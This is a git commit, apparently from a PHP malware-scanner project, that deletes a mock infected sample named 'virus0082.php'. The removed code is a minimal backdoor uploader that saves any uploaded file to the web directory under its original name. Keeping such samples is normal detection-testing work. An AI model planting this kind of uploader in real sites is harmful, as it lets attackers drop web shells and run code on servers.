90b175248818b58e772454913ab220fb173e7397
Nick <ntorgov@gmail.com>
2017-07-04 08:47:29 +0300

    #69 (thekadeshi.py-69) 0067

--- mock/theKadeshi.infected-master/0001-0100/virus0082.php
+++
@@ -1,9 +0,0 @@
-<?php
-if ($mode=='upload') {
-   if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
-   {
-     move_uploaded_file($_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"]);
-	 echo $_FILES["filename"]["name"];
-   } 
-} 
-?>
